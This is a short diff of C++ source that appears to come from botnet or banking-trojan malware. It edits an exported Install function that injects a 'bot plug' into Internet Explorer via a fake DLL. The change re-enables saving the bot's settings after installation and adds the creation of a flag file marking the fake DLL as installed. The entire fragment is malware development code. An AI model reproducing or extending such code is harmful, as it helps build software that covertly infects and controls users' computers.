@@ -11,6 +11,7 @@
 #include "DbgRpt.h"
 #include "Utils.h"
 #include "getsec.h"
+#include "StrConsts.h"
 
 #include "BotSocket.h"
 
@@ -601,8 +602,11 @@ extern "C" BOOL WINAPI Install( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 	FAKEDLLDBG( "FakeInstall", "Started size bot plug=%d", sizeBotPlug );
 
 	DWORD res = InstallForIe( bodyBotPlug, sizeBotPlug );
-//	if( res )
-//		BOT::SaveSettings(true, false, false);
+	if( res )
+	{
+		BOT::SaveSettings(true, false, false);
+		Bot->CreateFileA( 0, GetStr(EStrFakeDllFlag).t_str() );
+	}
 	return res;
 }
 
